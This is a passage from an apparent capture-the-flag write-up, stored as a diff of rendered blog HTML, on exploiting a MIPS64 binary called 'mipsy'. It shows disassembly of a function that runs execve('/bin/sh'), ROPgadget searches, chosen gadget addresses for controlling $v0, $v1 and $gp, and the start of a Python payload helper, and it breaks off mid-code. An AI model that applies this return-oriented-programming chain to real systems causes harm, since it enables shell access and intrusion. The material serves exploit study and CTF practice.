+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>                 <span class="no">.globl</span> <span class="no">ip</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ip</span><span class="p">:</span>                                      <span class="c">; CODE XREF: main+260↓p
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span>                                          <span class="c">; DATA XREF: LOAD:0000000120002438↑o ...
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ret</span>             <span class="err">=</span> <span class="p">-</span><span class="mi">0x1050</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">n_read</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x104C</span> 
+<span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span> <span class="no">fd</span>              <span class="err">=</span> <span class="p">-</span><span class="mi">0x1048</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_1044</span>        <span class="err">=</span> <span class="p">-</span><span class="mi">0x1044</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">buf</span>             <span class="err">=</span> <span class="p">-</span><span class="mi">0x1040</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ptr_binsh</span>       <span class="err">=</span> <span class="p">-</span><span class="mi">0x40</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">dash_c</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x38</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_30</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x30</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">null</span>            <span class="err">=</span> <span class="p">-</span><span class="mi">0x28</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_18</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x18</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_10</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x10</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_8</span>           <span class="err">=</span> <span class="p">-</span><span class="mi">8</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>
+<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>                 <span class="no">daddiu</span>  <span class="no">$sp</span><span class="p">,</span> <span class="p">-</span><span class="mi">0x1050</span>     <span class="c">; Doubleword Add Immediate Unsigned
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC4</span>                 <span class="no">sd</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x1050</span><span class="err">+</span><span class="no">var_8</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC8</span>                 <span class="no">sd</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x1050</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FCC</span>                 <span class="no">sd</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x1050</span><span class="err">+</span><span class="no">var_18</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FD0</span>                 <span class="no">move</span>    <span class="no">$fp</span><span class="p">,</span> <span class="no">$sp</span>         <span class="c">; prologue
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FD4</span>                 <span class="no">lui</span>     <span class="no">$gp</span><span class="p">,</span> <span class="mi">4</span>           <span class="c">; Load Upper Immediate
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FD8</span>                 <span class="no">daddu</span>   <span class="no">$gp</span><span class="p">,</span> <span class="no">$t9</span>         <span class="c">; Doubleword Add Unsigned
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FDC</span>                 <span class="no">daddiu</span>  <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x4060</span>      <span class="c">; Doubleword Add Immediate Unsigned
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FE0</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FE4</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aBinSh</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;/bin/sh&#34;
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FE8</span>                 <span class="no">sd</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1010</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FEC</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FF0</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aC</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;-c&#34;
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FF4</span>                 <span class="no">sd</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1018</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FF8</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FFC</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aListInterfaces</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;./list_interfaces.sh&#34;
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004000</span>                 <span class="no">sd</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1020</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004004</span>                 <span class="no">sd</span>      <span class="no">$zero</span><span class="p">,</span> <span class="mi">0x1028</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004008</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">8</span>      <span class="c">; Doubleword Add Immediate Unsigned
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000400</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; pipedes
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004010</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">pipe</span>        <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004014</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; pipe
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004018</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; pipe       ; Jump And Link Register
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000401</span><span class="no">C</span>                 <span class="no">nop</span>                      <span class="c">; nop
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004020</span>                 <span class="no">move</span>    <span class="no">$v1</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; return value
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004024</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0xFFFFFFFFFFFFFFFF</span>  <span class="c">; Doubleword Load Immediate
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004028</span>                 <span class="no">bne</span>     <span class="no">$v1</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004070</span>  <span class="c">; Branch on Not Equal
+</span><span class="c">; skip
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004070</span> <span class="no">loc_120004070</span><span class="p">:</span>                           <span class="c">; CODE XREF: ip+68↑j
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004070</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">fork</span>        <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004074</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fork
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004078</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; fork       ; Jump And Link Register
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000407</span><span class="no">C</span>                 <span class="no">nop</span>                      <span class="c">; nop
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004080</span>                 <span class="no">sw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Store Word
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004084</span>                 <span class="no">lw</span>      <span class="no">$v1</span><span class="p">,</span> <span class="mi">0</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Load Word
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004088</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="p">-</span><span class="mi">1</span>          <span class="c">; Doubleword Load Immediate
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000408</span><span class="no">C</span>                 <span class="no">bne</span>     <span class="no">$v1</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_1200040D4</span>  <span class="c">; Branch on Not Equal
+</span><span class="c">; skip
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">D4</span> <span class="no">loc_1200040D4</span><span class="p">:</span>                           <span class="c">; CODE XREF: ip+CC↑j
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">D4</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Load Word
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">D8</span>                 <span class="no">bnez</span>    <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004158</span>  <span class="c">; Branch on Not Zero
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">DC</span>                 <span class="no">nop</span>                      <span class="c">; nop
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">E0</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0xC</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>    <span class="c">; Load Word
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">E4</span>                 <span class="no">li</span>      <span class="no">$a1</span><span class="p">,</span> <span class="mi">1</span>           <span class="c">; fd2
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">E8</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fd
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">EC</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">dup2</span>        <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">F0</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; dup2
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">F4</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; dup2       ; Jump And Link Register
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">F8</span>                 <span class="no">nop</span>                      <span class="c">; nop
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">FC</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">8</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Load Word
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004100</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fd
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004104</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">close</span>       <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004108</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; close
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000410</span><span class="no">C</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; close      ; Jump And Link Register
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004110</span>                 <span class="no">nop</span>                      <span class="c">; nop
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004114</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0xC</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>    <span class="c">; Load Word
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004118</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fd
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000411</span><span class="no">C</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">close</span>       <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004120</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; close
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004124</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; close      ; Jump And Link Register
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004128</span>                 <span class="no">nop</span>                      <span class="c">; nop
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000412</span><span class="no">C</span>                 <span class="no">ld</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1010</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Load Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004130</span>                 <span class="no">daddiu</span>  <span class="no">$v1</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x1010</span>  <span class="c">; Doubleword Add Immediate Unsigned
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004134</span>                 <span class="no">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; envp
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004138</span>                 <span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; argv
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000413</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; path
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004140</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">execve</span>      <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004144</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; execve
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004148</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; execve     ; Jump And Link Register
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000414</span><span class="no">C</span>                 <span class="no">nop</span>
+<span class="c">; skip
+</span><span class="c"></span><span class="err">```</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>It&rsquo;s a part of the <code>ip</code> function, called when we trigger the &ldquo;Show network interfaces&rdquo; option. When I saw at the begin of the function, some local variables like a pointer to the <code>&quot;/bin/sh&quot;</code> string and a block of code which executes especially <code>execve(&quot;/bin/sh&quot;, &quot;-c&quot;, NULL)</code>. Since I discovered this basic block I thought I should have to jump around it with the right stackframe. But after a few hours I figured out it wasn&rsquo;t possible :(. And figured out too that the <code>NULL</code> byte isn&rsquo;t a badchar :).</p>
+<div class="gblog-post__anchorwrap">
+    <h4 id="ropchain">
+        ROPchain
+        <a data-clipboard-text="http://n4sm.github.io/posts/mipsy/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h4>
+</div>
+<p>Now we&rsquo;re able to craft a ropchain with only one badchar: &ldquo;\n&rdquo;. To do so we can launch <a
+  class="gblog-markdown__link"
+  href="https://github.com/JonathanSalwan/ROPgadget"
+  
+  >ROPgadget</a
+> to find some suitable gadgets:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ROPgadget --binary mipsy &gt; gadgets
+</code></pre></div><p>On mips architechture there is no <code>ret</code> or <code>pop</code> instructions, to handle this issue we use gadgets which load directly a 64 bit value stored in the stack into a register like this:</p>
+<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">ld $a0, 0x8($sp) ; It will read the doubleword in $sp+8 to load it in the $a0 register.
+</code></pre><p>And to return we need to find a load on a register like <code>$t9</code> which is often used to resolve and call extern functions or on <code>$ra</code> which is the standard register used to store the address of the calling function.</p>
+<p>And that&rsquo;s why it&rsquo;s too hard to find automatically gadgets for mips binaries. But fortunately, ROPgadgets finds a a great amount of gadgets which helps us a lot.</p>
+<p>The exploitation would be for me to jmp to the execve&rsquo;s call with the right context.
+The code looks like such:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120004134</span>                 <span class="nf">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; envp
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004138</span>                 <span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; argv
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000413</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; path
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004140</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">execve</span>      <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004144</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; execve
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004148</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; execve     ; Jump And Link Register
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000414</span><span class="no">C</span>                 <span class="no">nop</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>To do so we have to:</p>
+<ul>
+<li>set <code>$v1</code> register to <code>NULL</code></li>
+<li>set <code>$v0</code> register to a pointer to <code>/bin/sh</code></li>
+<li>set <code>$gp</code>, the global pointer to the right value to be able do execute the <code>dla</code> instruction.</li>
+</ul>
+<p>An important thing to notice is that on mips architechture, when an instruction is executed the next instruction is too executed despite of the result of the current instruction. So when we will choose our gadgets, we need to be careful according to the instruction after the control flow instruction.</p>
+<p>And the good value for <code>$gp</code> is a constant from which the <a
+  class="gblog-markdown__link"
+  href="https://sourceware.org/binutils/docs-2.24/as/MIPS-Small-Data.html"
+  
+  ><code>dla</code></a
+> instruction addresses memory areas. And if we check the value of <code>$gp</code> in gdb, we got: <code>0x120048020</code>.</p>
+<p>To control the <code>$v1</code> register we can grep on the gadgets found by ROPgadget:</p>
+<pre tabindex="0"><code>$ grep &quot;ld \$v0, &quot; gadgets | grep \$sp
+</code></pre><p>Then we got a lot of candidate which are not efficient. And if we&rsquo;re very careful we find an interesting gadget:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">0x000000012001b4d8 : ld <span class="nv">$v0</span>, 0x210<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> ld <span class="nv">$t9</span>, 0x228<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> jalr <span class="nv">$t9</span> <span class="p">;</span> move <span class="nv">$a0</span>, <span class="nv">$s6</span>
+</code></pre></div><p>It&rsquo;s perfect because it allows us to control the value of <code>$v0</code> and the value of the next gadget that we can store in <code>$t9</code> to jump on !</p>
+<p>We can apply process to find a gadget for $v1:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ grep <span class="s2">&#34;ld \$v1, &#34;</span> gadgets <span class="p">|</span> grep <span class="se">\$</span>sp
+<span class="o">[</span>skip<span class="o">]</span>
+0x000000012001270c : ld <span class="nv">$v1</span>, 0x80<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> sd <span class="nv">$v0</span>, 0xf0<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> dsubu <span class="nv">$s5</span>, <span class="nv">$v0</span>, <span class="nv">$v1</span> <span class="p">;</span> dsll <span class="nv">$v0</span>, <span class="nv">$s5</span>, <span class="m">6</span> <span class="p">;</span> ld <span class="nv">$a0</span>, 0xb8<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> ld <span class="nv">$t9</span>, 0xe0<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> move <span class="nv">$a1</span>, <span class="nv">$v0</span> <span class="p">;</span> sd <span class="nv">$v1</span>, 0xf8<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> jalr <span class="nv">$t9</span> <span class="p">;</span> sd <span class="nv">$v0</span>, 0x100<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span>
+<span class="o">[</span>skip<span class="o">]</span>
+</code></pre></div><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
+<p>Finally we need to control the value of the <code>$gp</code> register but to achieve that we do not need to use a gadget, because we already control it thanks to the vuln epilogue:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">00000001200046</span><span class="nf">A4</span> <span class="no">loc_1200046A4</span><span class="p">:</span>                           <span class="c"># CODE XREF: authenticate+104↑j
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A4</span>                 <span class="no">move</span>    <span class="no">$sp</span><span class="p">,</span> <span class="no">$fp</span>         <span class="c"># _
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A8</span>                 <span class="no">ld</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">ret_addr</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">AC</span>                 <span class="no">ld</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B0</span>                 <span class="no">ld</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_18</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B4</span>                 <span class="no">daddiu</span>  <span class="no">$sp</span><span class="p">,</span> <span class="mi">0x90</span>        <span class="c"># Doubleword Add Immediate Unsigned
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B8</span>                 <span class="no">jr</span>      <span class="no">$ra</span>              <span class="c"># Jump Register
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">BC</span>                 <span class="no">nop</span></code></pre></td></tr></table>
+</div>
+</div>
+<div class="gblog-post__anchorwrap">
+    <h2 id="put-all-together">
+        Put all together
+        <a data-clipboard-text="http://n4sm.github.io/posts/mipsy/#put-all-together" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Put all together" href="#put-all-together">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>For the pruposes of mips exploitation I developped a small function in python which inserts automatically a value at an arbitrary offset.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">make_pld</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="n">pos</span><span class="p">:</span>
